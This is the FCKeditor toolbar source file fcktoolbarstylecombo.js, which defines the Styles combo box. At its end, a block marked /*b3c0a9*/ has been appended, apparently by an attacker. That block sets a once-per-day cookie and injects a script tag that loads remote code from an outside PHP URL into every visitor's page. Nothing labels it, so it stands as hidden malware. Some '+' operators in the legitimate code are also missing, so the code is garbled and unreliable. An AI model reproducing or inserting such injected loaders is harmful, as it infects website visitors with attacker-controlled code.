/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fcktoolbarstylecombo.js
 * 	FCKToolbarPanelButton Class: Handles the Fonts combo selector.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKToolbarStyleCombo = function( tooltip, style )
{
	this.Command	= FCKCommands.GetCommand( 'Style' ) ;
	this.Label		= this.GetLabel() ;
	this.Tooltip	= tooltip ? tooltip : this.Label ;
	this.Style		= style ? style : FCK_TOOLBARITEM_ICONTEXT ;
}

// Inherit from FCKToolbarSpecialCombo.
FCKToolbarStyleCombo.prototype = new FCKToolbarSpecialCombo ;

FCKToolbarStyleCombo.prototype.GetLabel = function()
{
	return FCKLang.Style ;
}

FCKToolbarStyleCombo.prototype.CreateItems = function( targetSpecialCombo )
{
	// Add the Editor Area CSS to the Styles panel so the style classes are previewed correctly.
	FCKTools.AppendStyleSheet( targetSpecialCombo._Panel.Document, FCKConfig.EditorAreaCSS ) ;
	
	targetSpecialCombo._Panel.Document.body.className  = ' ForceBaseFont' ;

	// For some reason Gecko is blocking inside the "RefreshVisibleItems" function.
	if ( ! FCKBrowserInfo.IsGecko )
		targetSpecialCombo.OnBeforeClick = this.RefreshVisibleItems ;

	// Add the styles to the special combo.
	for ( var s in this.Command.Styles )
	{
		var oStyle = this.Command.Styles[s] ;
		var oItem ;
		
		if ( oStyle.IsObjectElement )
			oItem = targetSpecialCombo.AddItem( s, s ) ;
		else
			oItem = targetSpecialCombo.AddItem( s, oStyle.GetOpenerTag()   s   oStyle.GetCloserTag() ) ;
			
		oItem.Style = oStyle ;
	}
}

FCKToolbarStyleCombo.prototype.RefreshActiveItems = function( targetSpecialCombo )
{
	// Clear the actual selection.
	targetSpecialCombo.DeselectAll() ;
	
	// Get the active styles.
	var aStyles = this.Command.GetActiveStyles() ;
	
	if ( aStyles.length > 0 )
	{
		// Select the active styles in the combo.
		for ( var i = 0 ; i < aStyles.length ; i   )
			targetSpecialCombo.SelectItem( aStyles[i].Name ) ;

		// Set the combo label to the first style in the collection.
		targetSpecialCombo.SetLabelById( aStyles[0].Name ) ;
	}
	else
		targetSpecialCombo.SetLabel('') ;
}

FCKToolbarStyleCombo.prototype.RefreshVisibleItems = function( targetSpecialCombo )
{
	if ( FCKSelection.GetType() == 'Control' )
		var sTagName = FCKSelection.GetSelectedElement().tagName ;

	for ( var i in targetSpecialCombo.Items )
	{
		var oItem = targetSpecialCombo.Items[i] ;
		if ( ( sTagName && oItem.Style.Element == sTagName ) || ( ! sTagName && ! oItem.Style.IsObjectElement ) )
			oItem.style.display = '' ;
		else
			oItem.style.display = 'none' ;	// For some reason Gecko is blocking here.
	}
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
